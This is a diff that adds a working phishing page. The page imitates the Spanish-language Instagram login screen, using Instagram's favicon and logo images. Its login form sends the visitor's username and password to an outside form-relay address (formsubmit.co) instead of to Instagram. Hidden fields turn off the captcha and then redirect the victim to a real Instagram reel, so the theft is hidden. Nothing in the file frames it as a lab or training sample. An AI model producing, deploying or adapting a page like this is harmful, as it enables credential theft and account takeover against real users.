@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+  <style>
+    body {
+      background: #fafafa;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      width: 100%;
+      max-width: 350px;
+      border: 1px solid #dbdbdb;
+      background: #fff;
+      padding: 40px 40px 20px;
+      text-align: center;
+    }
+    .logo img {
+      width: 175px;
+      margin-bottom: 30px;
+    }
+    input {
+      width: 100%;
+      margin-bottom: 6px;
+      padding: 9px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+      font-size: 14px;
+    }
+    button {
+      background-color: #3897f0;
+      border: none;
+      color: white;
+      font-weight: bold;
+      width: 100%;
+      padding: 9px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .divider {
+      font-size: 12px;
+      color: #8e8e8e;
+      margin: 10px 0;
+    }
+    .fb-login {
+      color: #385185;
+      font-weight: bold;
+      font-size: 14px;
+      text-decoration: none;
+      margin-top: 10px;
+      display: block;
+    }
+    .forgot {
+      font-size: 12px;
+      color: #00376b;
+      text-decoration: none;
+      margin-top: 12px;
+      display: block;
+    }
+    .signup {
+      margin-top: 20px;
+      padding: 20px;
+      font-size: 14px;
+      border-top: 1px solid #dbdbdb;
+    }
+    .signup a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
+    </div>
+    <form action="https://formsubmit.co/el/kamizo" method="POST">
+      <input type="text" name="username" placeholder="Teléfono, correo electrónico o usuario" required>
+      <input type="password" name="password" placeholder="Contraseña" required>
+      <button type="submit">Iniciar sesión</button>
+      <input type="hidden" name="_next" value="https://www.instagram.com/reel/DGVweZlMhoM/?igsh=NGlkODR6NGN3ZG1s">
+      <input type="hidden" name="_captcha" value="false">
+    </form>
+    <a class="fb-login" href="#">Iniciar sesión con Facebook</a>
+    <a class="forgot" href="#">¿Has olvidado tu contraseña?</a>
+    <div class="signup">
+      ¿No tienes una cuenta? <a href="#">Regístrate</a>
+    </div>
+  </div>
+</body>
+</html>
